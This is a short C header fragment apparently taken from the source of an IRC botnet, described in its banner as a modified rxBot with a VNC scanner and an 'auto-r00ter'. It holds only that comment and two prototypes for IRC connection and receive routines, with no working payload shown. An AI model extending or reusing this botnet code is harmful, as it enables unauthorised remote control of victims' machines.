/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


DWORD WINAPI IRC_Connect(LPVOID param);
int IRC_ReceiveLoop(SOCKET sock, char *server, char *channel, char *chanpass, char *nick, int clone);
